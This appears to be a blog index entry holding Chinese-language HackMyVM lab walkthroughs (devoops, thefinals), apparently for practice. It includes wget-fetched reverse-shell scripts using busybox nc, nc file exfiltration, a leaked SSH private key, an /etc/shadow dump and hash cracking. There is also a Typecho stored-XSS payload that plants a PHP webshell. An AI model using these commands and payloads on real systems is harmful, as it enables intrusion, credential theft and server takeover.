\u547d\u4ee4\uff0c\u53ef\u4ee5\u67e5\u770b\u76ee\u6807\u7cfb\u7edf\u652f\u6301\u7684\u5de5\u5177\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl -g -H 'Authorization: Bearer $ADMIN_TOKEN' 'http://192.168.205.149:3000/execute?cmd=busybox'\n{'status':'executed','data':{'stdout':'BusyBox v1.37.0 ... \\n ... \\n\\t ... nc, netstat, ... wget, ...\\n ...','stderr':''}}\n```\n\n\u76ee\u6807\u7cfb\u7edf\u5b58\u5728 `busybox nc` \u548c `wget`\uff0c\u4e14\u5747\u672a\u88ab`COMMAND_FILTER`\u8fc7\u6ee4\u3002\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u5de5\u5177\u6765\u83b7\u53d6\u53cd\u5f39Shell\u3002\n\n1. \u5728\u672c\u5730Kali\u653b\u51fb\u673a\u4e0a\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u53cd\u5f39Shell\u547d\u4ee4\u7684\u811a\u672c `sss`\u3002\n\n   ```shell\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ cat sss\n   busybox nc 192.168.205.128 8888 -e /bin/ash\n   ```\n\n2. \u5728Kali\u4e0a\u5f00\u542f\u4e00\u4e2a\u4e34\u65f6\u7684HTTP\u670d\u52a1\uff0c\u7528\u4e8e\u9776\u673a\u4e0b\u8f7d\u811a\u672c\u3002\n\n   ```shell\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ python3 -m http.server 80\n   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n   ```\n\n3. \u5728Kali\u4e0a\u4f7f\u7528 `nc` \u76d1\u542c8888\u7aef\u53e3\uff0c\u51c6\u5907\u63a5\u6536\u53cd\u5f39Shell\u3002\n\n   ```shell\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ nc -lvnp 8888\n   ```\n\n4. \u901a\u8fc7RCE\u6f0f\u6d1e\uff0c\u6267\u884c\u4e00\u4e32\u547d\u4ee4\uff1a\u4e0b\u8f7d\u811a\u672c(`wget`)\uff0c\u8d4b\u4e88\u6267\u884c\u6743\u9650(`chmod`)\uff0c\u7136\u540e\u6267\u884c\u811a\u672c\u3002\n\n   ```shell\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ curl -g -H 'Authorization: Bearer $ADMIN_TOKEN' 'http://192.168.205.149:3000/execute?cmd=wget%20192%2E168%2E205%2E128%2Fsss%0Achmod%20%2Bx%20%2E%2Fsss%0A%2E%2Fsss'\n   ```\n\n\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39Shell\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888                     \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 45275\nid\nuid=1000(runner) gid=1000(runner) groups=1000(runner)\n```\n\n# **\u56db\u3001\u6a2a\u5411\u79fb\u52a8**\n\n\u5728\u83b7\u5f97\u7684Shell\u4e2d\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\uff0c\u53d1\u73b0 `/opt` \u76ee\u5f55\u4e0b\u5b58\u5728\u4e00\u4e2a `gitea` \u76ee\u5f55\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u540d\u4e3a `node.git` \u7684git\u4ed3\u5e93\u3002\n\n```shell\n...\ncd /opt/gitea/git/hana\nls -al\ntotal 12\ndrwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 .\ndrwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 ..\ndrwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 node.git\n```\n\n\u4e3a\u4e86\u6df1\u5165\u5206\u6790\uff0c\u6211\u4eec\u5c06\u6574\u4e2a `node.git` \u4ed3\u5e93\u6253\u5305\u5e76\u4f20\u56deKali\u653b\u51fb\u673a\u3002\n\n1. \u5728\u9776\u673a\u4e0a\uff0c\u5c06 `node.git` \u76ee\u5f55\u6253\u5305\u3002\n\n   ```shell\n   busybox tar -cf /tmp/1.tar node.git\n   ```\n\n2. \u5728Kali\u4e0a\u76d1\u542c1234\u7aef\u53e3\uff0c\u5e76\u5c06\u63a5\u6536\u5230\u7684\u6570\u636e\u4fdd\u5b58\u4e3a `1.tar`\u3002\n\n   ```shell\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n   \u2514\u2500$ nc -lvnp 1234 > 1.tar\n   ```\n\n3. \u5728\u9776\u673a\u4e0a\uff0c\u4f7f\u7528 `nc` \u5c06\u6253\u5305\u597d\u7684\u6587\u4ef6\u53d1\u9001\u5230Kali\u3002\n\n   ```shell\n   cat 1.tar|busybox nc 192.168.205.128 1234\n   ```\n\n\u6587\u4ef6\u4f20\u8f93\u5b8c\u6210\u540e\uff0c\u5728Kali\u4e0a\u89e3\u538b\u5e76\u5206\u6790git\u4ed3\u5e93\u7684\u5386\u53f2\u8bb0\u5f55\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ tar -xf 1.tar\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cd node.git \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/node.git]\n\u2514\u2500$ git log -p\n```\n\n`git log -p` \u7684\u8f93\u51fa\u663e\u793a\u4e86\u4e00\u4e2a\u975e\u5e38\u5173\u952e\u7684\u63d0\u4ea4\u5386\u53f2\uff1a\u5f00\u53d1\u8005\u66fe\u9519\u8bef\u5730\u5c06\u4e00\u4e2aSSH\u79c1\u94a5 `id_ed25519` \u63d0\u4ea4\u5230\u4ed3\u5e93\uff0c\u968f\u540e\u53c8\u5728\u4e0b\u4e00\u6b21\u63d0\u4ea4\u4e2d\u5c06\u5176\u5220\u9664\u3002\n\n```diff\ncommit 1994a70bbd080c633ac85a339fd85a8635c63893 (HEAD -> main)\nAuthor: azwhikaru <37921907+azwhikaru@users.noreply.github.com>\nDate:   Mon Apr 21 14:36:12 2025 +0800\n\n    del: oops!\n\ndiff --git a/id_ed25519 b/id_ed25519\ndeleted file mode 100644\nindex a2626a4..0000000\n--- a/id_ed25519\n+++ /dev/null\n@@ -1,7 +0,0 @@\n------BEGIN OPENSSH PRIVATE KEY-----\n-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN\n-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg\n-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z\n-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==\n------END OPENSSH PRIVATE KEY-----\n```\n\n\u4ecediff\u4fe1\u606f\u4e2d\u63d0\u53d6\u79c1\u94a5\u5185\u5bb9\u5e76\u8fd8\u539f\u3002\u5728\u53cd\u5f39Shell\u4e2d\uff0c\u901a\u8fc7`netstat -lntup`\u53d1\u73b0SSH\u670d\u52a1\u4ec5\u76d1\u542c\u5728`127.0.0.1:22`\uff0c\u65e0\u6cd5\u4ece\u5916\u90e8\u76f4\u63a5\u8bbf\u95ee\u3002\n\n```shell\nnetstat -lntup\nActive Internet connections (only servers)\n...          \ntcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -                   \n...\n```\n\n\u4e3a\u4e86\u80fd\u591f\u4f7f\u7528\u83b7\u53d6\u5230\u7684\u79c1\u94a5\u767b\u5f55\uff0c\u9700\u8981\u5728\u9776\u673a\u4e0a\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1\uff0c\u5c06\u5185\u90e8\u7684SSH\u670d\u52a1\u66b4\u9732\u7ed9\u653b\u51fb\u673a\u3002\u8fd9\u91cc\u4f7f\u7528`socat`\u5c062222\u7aef\u53e3\u7684\u6d41\u91cf\u8f6c\u53d1\u81f3127.0.0.1:22\u3002\n\n```shell\nsocat TCP-LISTEN:2222,fork TCP4:127.0.0.1:22 &\n```\n\n\u73b0\u5728\uff0c\u53ef\u4ee5\u4f7f\u7528\u79c1\u94a5\u901a\u8fc72222\u7aef\u53e3SSH\u767b\u5f55`hana`\u7528\u6237\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ # ... (\u8fd8\u539f\u79c1\u94a5\u5230 /tmp/id_rsa) ...\n                                                                                   \u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ sed -i 's/^-//' id_rsa                                                                                          \n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ chmod 600 id_rsa\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ ssh hana@192.168.205.149 -p 2222 -i /tmp/id_rsa\n...\ndevoops:~$ id\nuid=1001(hana) gid=100(users) groups=100(users),100(users)\n```\n\n\u6210\u529f\u4ee5 `hana` \u7528\u6237\u8eab\u4efd\u767b\u5f55\u3002\n\n# **\u4e94\u3001\u6743\u9650\u63d0\u5347**\n\n\u767b\u5f55 `hana` \u7528\u6237\u540e\uff0c\u68c0\u67e5\u5176 `sudo` \u6743\u9650\u3002\n\n```shell\ndevoops:~$ sudo -l\nMatching Defaults entries for hana on devoops:\n...\nUser hana may run the following commands on devoops:\n    (root) NOPASSWD: /sbin/arp\n```\n\n\u7ed3\u679c\u663e\u793a `hana` \u7528\u6237\u53ef\u4ee5\u65e0\u5bc6\u7801\u4ee5root\u6743\u9650\u6267\u884c `/sbin/arp` \u547d\u4ee4\u3002\u8fd9\u662f\u4e00\u4e2a\u5df2\u77e5\u7684\u53ef\u88ab\u5229\u7528\u4e8e\u63d0\u6743\u7684\u914d\u7f6e\u3002\u67e5\u8be2 [[GTFOBins](https://gtfobins.github.io/gtfobins/arp/#sudo)](https://gtfobins.github.io/gtfobins/arp/#sudo) \u53ef\u77e5\uff0c`arp` \u547d\u4ee4\u7684 `-f` \u53c2\u6570\u53ef\u4ee5\u52a0\u8f7d\u4e00\u4e2a\u6587\u4ef6\uff0c\u5982\u679c\u6307\u5b9a\u7684\u6587\u4ef6\u4e0d\u5b58\u5728\u6216\u683c\u5f0f\u9519\u8bef\uff0c\u5b83\u4f1a\u5c1d\u8bd5\u9010\u884c\u8bfb\u53d6\u5e76\u663e\u793a\u6587\u4ef6\u5185\u5bb9\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u3002\n\n\u5229\u7528\u6b64\u7279\u6027\u8bfb\u53d6 `/etc/shadow` \u6587\u4ef6\uff0c\u83b7\u53d6root\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u3002\n\n```shell\ndevoops:~$ sudo arp -v -f /etc/shadow\n>> root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::\n....\n```\n\n\u5c06\u83b7\u53d6\u5230\u7684root\u7528\u6237\u54c8\u5e0c\u4fdd\u5b58\u5230\u672c\u5730\u6587\u4ef6\uff0c\u5e76\u4f7f\u7528 `john` \u548c\u5b57\u5178\u8fdb\u884c\u7834\u89e3\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ echo 'root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.' > hash\n                          \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ john --wordlist=xato-net-10-million-passwords.txt hash\n...\neris             (root)     \n...\nSession completed. \n```\n\n\u6210\u529f\u7834\u89e3\u51faroot\u5bc6\u7801\u4e3a `eris`\u3002\n\n# **\u516d\u3001\u83b7\u53d6Flag**\n\n\u4f7f\u7528\u7834\u89e3\u51fa\u7684\u5bc6\u7801\u5207\u6362\u5230 `root` \u7528\u6237\uff0c\u63d0\u6743\u5b8c\u6210\u3002\n\n```shell\ndevoops:~$ su -\nPassword: \ndevoops:~#\n```\n\n\u6700\u540e\uff0c\u5728 `root` \u548c `hana` \u7684\u5bb6\u76ee\u5f55\u4e2d\u627e\u5230\u5e76\u8bfb\u53d6flag\u6587\u4ef6\u3002\n\n```shell\ndevoops:~# cat /root/R007.7x7oOoOoOoOoOoO /home/hana/user.flag \nflag{a834296543f4c2990909ce1c56becfba}\nflag{03d0e150ae9fc686a827b41e1969d497}\n```sentence", "top": 0, "createdAt": 1756037424, "style": "<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-tip {border-left-color:var(--borderColor-success-emphasis, var(--color-success-emphasis));background-color:var(--color-success-subtle);}.markdown-alert.markdown-alert-tip .markdown-alert-title {color: var(--fgColor-success,var(--color-success-fg));}</style>", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-24", "dateLabelColor": "#0969da"}, "P233": {"htmlDir": "docs/post/hmv_thefinals.html", "labels": ["HackMyVM"], "postTitle": "hmv_thefinals", "postUrl": "post/hmv_thefinals.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/233", "commentNum": 0, "wordCount": 9007, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1.1 \u4e3b\u673a\u53d1\u73b0\u4e0e\u7aef\u53e3\u626b\u63cf\n\n\u9996\u5148\uff0c\u4f7f\u7528 `arp-scan` \u5728\u672c\u5730\u7f51\u7edc\u4e2d\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u7684 IP \u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l                         \n...\n192.168.205.157 08:00:27:19:f4:ef       PCS Systemtechnik GmbH\n...\n```\n\n\u786e\u5b9a\u76ee\u6807\u4e3b\u673a IP \u4e3a `192.168.205.157`\u3002\u63a5\u7740\uff0c\u4f7f\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u786e\u5b9a\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.157\n...\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:19:F4:EF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u4e3b\u673a\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u4e24\u4e2a\u7aef\u53e3\u3002\n\n## 1.2 Web \u670d\u52a1\u63a2\u6d4b\n\n\u8bbf\u95ee\u76ee\u6807\u4e3b\u673a\u7684 80 \u7aef\u53e3\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u540d\u4e3a 'THE FINALS' \u7684\u9759\u6001\u7f51\u7ad9\uff0c\u9875\u9762\u6e90\u7801\u663e\u793a\u8fd9\u662f\u4e00\u4e2a\u57fa\u4e8e\u6a21\u677f\u7684\u7f51\u7ad9\uff0c\u6ca1\u6709\u76f4\u63a5\u53ef\u5229\u7528\u7684\u4fe1\u606f\u3002\n\n\u4f7f\u7528\u76ee\u5f55\u626b\u63cf\u5de5\u5177 `dirsearch` \u8fdb\u4e00\u6b65\u63a2\u6d4b Web \u670d\u52a1\u7684\u76ee\u5f55\u7ed3\u6784\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ dirsearch -u http://192.168.205.157\n...\n[10:46:28] 200 -   17KB - /blog/\n[10:46:28] 200 -  820B  - /cgi-bin/printenv\n[10:46:28] 200 -    1KB - /cgi-bin/test-cgi\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u53d1\u73b0 `/cgi-bin/printenv` \u548c `/cgi-bin/test-cgi` \u4e24\u4e2a CGI \u811a\u672c\uff0c\u4f46\u8bbf\u95ee\u540e\u53d1\u73b0\u5b83\u4eec\u53ea\u662f\u7528\u4e8e\u6d4b\u8bd5\u7684\u793a\u4f8b\u811a\u672c\uff0c\u5e76\u672a\u6267\u884c\uff0c\u6ca1\u6709\u5b9e\u9645\u5229\u7528\u4ef7\u503c\u3002\n\n\u5173\u952e\u53d1\u73b0\u662f `/blog/` \u76ee\u5f55\u3002\u8bbf\u95ee\u8be5\u76ee\u5f55 `http://192.168.205.157/blog/`\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a Typecho \u535a\u5ba2\u7cfb\u7edf\u3002\u4e3a\u4e86\u65b9\u4fbf\u540e\u7eed\u64cd\u4f5c\uff0c\u5c06\u57df\u540d\u4e0e IP \u7ed1\u5b9a\u5230\u672c\u5730 hosts \u6587\u4ef6\u4e2d\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ tail -n 1 /etc/hosts      \n192.168.205.157 THEFINALS.hmv\n```\n\n\u901a\u8fc7\u9875\u9762\u4fe1\u606f\u548c\u7279\u5f81\u5224\u65ad\uff0c\u8be5\u535a\u5ba2\u7cfb\u7edf\u7248\u672c\u4e3a Typecho 1.2.0\u3002\n\n# \u4e8c\u3001\u6f0f\u6d1e\u5229\u7528 (Typecho 1.2.0 \u5b58\u50a8\u578b XSS)\n\n## 2.1 \u6f0f\u6d1e\u5206\u6790\n\n\u67e5\u8be2\u516c\u5f00\u6f0f\u6d1e\u5e93\u53ef\u77e5\uff0cTypecho 1.2.0 \u7248\u672c\u5b58\u5728\u4e00\u4e2a\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\uff08\u53c2\u8003 issue [#1546](https://github.com/typecho/typecho/issues/1546)\u3002\n\n*   **\u6f0f\u6d1e\u6210\u56e0**\uff1a\u6f0f\u6d1e\u5b58\u5728\u4e8e\u6587\u7ae0\u7684\u8bc4\u8bba\u529f\u80fd\u4e2d\u3002\u5f53\u7528\u6237\u63d0\u4ea4\u8bc4\u8bba\u65f6\uff0c\u5176\u586b\u5199\u7684\u4e2a\u4eba\u7f51\u7ad9 URL \u5b57\u6bb5\u5728\u540e\u7aef\u5904\u7406\u548c\u524d\u7aef\u6e32\u67d3\u65f6\u6ca1\u6709\u8fdb\u884c\u5145\u5206\u7684\u8fc7\u6ee4\u548c\u7f16\u7801\u3002\n*   **\u89e6\u53d1\u539f\u7406**\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u6076\u610f JavaScript \u4ee3\u7801\u6784\u9020\u5728 URL \u5b57\u6bb5\u4e2d\u3002\u4f8b\u5982\uff0c\u901a\u8fc7\u95ed\u5408\u524d\u4e00\u4e2a `<a>` \u6807\u7b7e\u5e76\u63d2\u5165\u4e00\u4e2a\u65b0\u7684 `<script>` \u6807\u7b7e\uff0c\u6765\u6ce8\u5165\u6076\u610f\u811a\u672c\u3002\u5f53\u7f51\u7ad9\u7ba1\u7406\u5458\u5728\u540e\u53f0\u7ba1\u7406\u8bc4\u8bba\u9875\u9762\uff08`manage-comments.php`\uff09\u67e5\u770b\u8fd9\u6761\u6076\u610f\u8bc4\u8bba\u65f6\uff0c\u8fd9\u6bb5 JavaScript \u4ee3\u7801\u5c31\u4f1a\u5728\u7ba1\u7406\u5458\u7684\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002\n*   **\u5229\u7528\u601d\u8def**\uff1a\u5229\u7528\u8fd9\u4e2a XSS \u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u6bb5 JavaScript payload\uff0c\u5f53\u7ba1\u7406\u5458\u67e5\u770b\u8bc4\u8bba\u65f6\uff0c\u8be5 payload \u4f1a\u5728\u540e\u53f0\u81ea\u52a8\u6267\u884c\u4e00\u7cfb\u5217\u64cd\u4f5c\uff0c\u4f8b\u5982\u4fee\u6539\u4e3b\u9898\u6587\u4ef6\uff08\u5982 `404.php`\uff09\u5e76\u5199\u5165\u4e00\u4e2a webshell\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9\u670d\u52a1\u5668\u7684\u63a7\u5236\u3002\n\n## 2.2 \u6784\u9020\u5e76\u6267\u884c Payload\n\n\u6839\u636e\u6f0f\u6d1e\u539f\u7406\uff0c\u6211\u4eec\u7f16\u5199\u4e00\u6bb5 JavaScript payload (`exp.js`)\uff0c\u5176\u529f\u80fd\u662f\uff1a\n\n1.  \u5728\u7ba1\u7406\u5458\u540e\u53f0\u9875\u9762\u4e2d\uff0c\u52a8\u6001\u521b\u5efa\u4e00\u4e2a\u4e0d\u53ef\u89c1\u7684 iframe\uff0c\u52a0\u8f7d\u4e3b\u9898\u6587\u4ef6 `404.php` \u7684\u7f16\u8f91\u9875\u9762\u3002\n2.  \u5728 iframe \u52a0\u8f7d\u5b8c\u6210\u540e\uff0c\u901a\u8fc7 `onload` \u4e8b\u4ef6\u89e6\u53d1 `writeShell()` \u51fd\u6570\u3002\n3.  `writeShell()` \u51fd\u6570\u4f1a\u5b9a\u4f4d\u5230 `404.php` \u7684\u6587\u672c\u7f16\u8f91\u6846\uff0c\u5c06 PHP \u4e00\u53e5\u8bdd\u6728\u9a6c `<?php system($_GET['a']); ?>` \u5199\u5165\u6587\u4ef6\u5185\u5bb9\u7684\u9876\u90e8\u3002\n4.  \u6700\u540e\uff0c\u6a21\u62df\u70b9\u51fb\u201c\u4fdd\u5b58\u6587\u4ef6\u201d\u6309\u94ae\uff0c\u5c06 webshell \u5199\u5165\u5230\u670d\u52a1\u5668\u3002\n\n```javascript\n// exp.js\nvar isSaved = false;\nvar attemptCounter = 0;\n\nfunction insertIframe() {\n    var path = window.location.pathname;\n    var adminBase = path.includes('manage-comments.php') \n        ? path.replace('manage-comments.php', '') \n        : '/admin/';\n    var themeUrl = adminBase + 'theme-editor.php?theme=default&file=404.php';\n\n    var iframe = `<iframe id='theme_id' src='${themeUrl}' width='0' height='0' onload='writeShell()'></iframe>`;\n    document.body.innerHTML += iframe;\n}\n\nfunction writeShell() {\n    if (isSaved || attemptCounter > 10) return;\n    attemptCounter++;\n\n    try {\n        var iframeDoc = document.getElementById('theme_id').contentWindow.document;\n        var content = iframeDoc.getElementById('content');\n        var buttons = iframeDoc.getElementsByTagName('button');\n\n        if (content && buttons.length > 1) {\n            var val = content.value;\n            var payload = '<?php system($_GET['a']); ?>\\n';\n            if (val.indexOf(payload) === -1) {\n                content.value = payload + val;\n                buttons[1].click();\n                isSaved = true;\n            }\n        }\n    } catch (e) {}\n\n    if (!isSaved) {\n        setTimeout(writeShell, 500); \n    }\n}\n\ninsertIframe();\n```\n\n\u63a5\u7740\uff0c\u5728\u672c\u5730\uff08Kali\uff09\u5f00\u542f\u4e00\u4e2a HTTP \u670d\u52a1\u6765\u6258\u7ba1 `exp.js`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n\n\u7136\u540e\uff0c\u5728\u535a\u5ba2\u7684\u6587\u7ae0\u8bc4\u8bba\u533a\u63d0\u4ea4\u4e00\u6761\u6076\u610f\u8bc4\u8bba\uff0c\u5176\u4e2d 'Website' \u5b57\u6bb5\u586b\u5165\u6211\u4eec\u6784\u9020\u597d\u7684 XSS payload\uff0c\u7528\u4e8e\u52a0\u8f7d\u8fdc\u7a0b\u7684 `exp.js` \u811a\u672c\u3002\n\n```\nhttp://a.com/'></a><script/src='http://192.168.205.128/exp.js'></script><a/href='#\n```\n\n\u5f53\u8bc4\u8bba\u63d0\u4ea4\u540e\uff0c\u7b49\u5f85\u4e00\u6bb5\u65f6\u95f4\uff08\u6a21\u62df\u7ba1\u7406\u5458\u67e5\u770b\u8bc4\u8bba\uff09\uff0c\u672c\u5730 HTTP \u670d\u52a1\u5668\u4f1a\u6536\u5230\u6765\u81ea\u76ee\u6807\u670d\u52a1\u5668\u7684\u8bf7\u6c42\uff0c\u8bf4\u660e XSS \u5df2\u6210\u529f\u89e6\u53d1\u3002\n\n```bash\n...\n192.168.205.1 - - [24/Aug/2025 10:53:08] 'GET /exp.js HTTP/1.1' 200 -\n...\n```\n\n## 2.3 \u83b7\u53d6 Webshell \u5e76\u53cd\u5f39 Shell\n\nXSS \u89e6\u53d1\u540e\uff0cwebshell \u5df2\u88ab\u5199\u5165 `/usr/themes/default/404.php`\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u8be5\u6587\u4ef6\u5e76\u4f20\u5165\u547d\u4ee4\u6765\u9a8c\u8bc1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.157/blog//usr/themes/default/404.php?a=id'         \nuid=102(apache) gid=103(apache) groups=82(www-data),103(apache),103(apache)\n```\n\n\u547d\u4ee4\u6210\u529f\u6267\u884c\u3002\u63a5\u4e0b\u6765\uff0c\u5728 Kali \u4e0a\u8bbe\u7f6e `netcat` \u76d1\u542c\uff0c\u5e76\u5229\u7528 webshell \u6267\u884c\u53cd\u5f39 shell \u547d\u4ee4\uff0c\u83b7\u53d6\u4e00\u4e2a\u4ea4\u4e92\u5f0f Shell\u3002\n\nKali \u76d1\u542c\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lnvp 8888\n```\n\n\u6267\u884c\u53cd\u5f39 Shell\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.157/blog//usr/themes/default/404.php?a=busybox%20nc%20192%2E168%2E205%2E128%208888%20%2De%20%2Fbin%2Fash'\n```\n\n\u6210\u529f\u83b7\u53d6\u5230 `apache` \u7528\u6237\u7684 Shell\uff0c\u5e76\u5347\u7ea7\u4e3a\u7a33\u5b9a\u7684 TTY\u3002\n\n# \u4e09\u3001\u6a2a\u5411\u79fb\u52a8\n\n## 3.1 \u4fe1\u606f\u641c\u96c6\n\n\u5728 `apache` \u7528\u6237\u7684 Shell \u4e2d\uff0c\u9996\u5148\u67e5\u770b\u535a\u5ba2\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u83b7\u53d6\u6570\u636e\u5e93\u51ed\u636e\u3002\n\n```bash\n/var/www/html/blog $ cat config.inc.php\n...\n$db->addServer(array (\n  'host' => 'localhost',\n  'port' => 3306,\n  'user' => 'typecho_u',\n  'password' => 'QLTkbviW71CSRZtGWIQdB6s',\n  'database' => 'typecho_db',\n...\n```\n\n\u4f7f\u7528\u83b7\u53d6\u5230\u7684\u51ed\u636e\u8fde\u63a5\u6570\u636e\u5e93\uff0c\u5e76\u67e5\u8be2 `typecho_users` \u8868\uff0c\u627e\u5230\u4e86 `staff` \u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u3002\u5c1d\u8bd5\u7834\u89e3\u8be5\u54c8\u5e0c\u672a\u679c\uff0c\u5224\u65ad\u4e3a\u5154\u5b50\u6d1e\u3002\n\n```bash\n/var/www/html/blog $ mysql -u typecho_u -pQLTkbviW71CSRZtGWIQdB6s typecho_db -e 'select * from typecho_users;'\n...\n|   1 | staff | $P$B/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1 | ...\n...\n```\n\n\u63a5\u7740\uff0c\u68c0\u67e5 `/home` \u76ee\u5f55\uff0c\u53d1\u73b0\u4e86 `june`, `scotty`, `staff` \u4e09\u4e2a\u7528\u6237\u3002\u5728 `/home/june` \u76ee\u5f55\u4e0b\u53d1\u73b0 `message.txt`\uff0c\u5185\u5bb9\u63d0\u5230\u4e86 'BROADCAST' \u548c 'CNS'\uff0c\u8fd9\u662f\u4e00\u4e2a\u91cd\u8981\u7ebf\u7d22\u3002\n\n\u901a\u8fc7 `find` \u547d\u4ee4\u67e5\u627e\u5c5e\u4e8e `scotty` \u7528\u6237\u7684\u6587\u4ef6\uff0c\u53d1\u73b0\u4e86\u65e5\u5fd7\u6587\u4ef6 `/var/log/scotty-main.log`\u3002\n\n```bash\n/home/june $ head -n 10 /var/log/scotty-main.log\nBroadcast to eth0 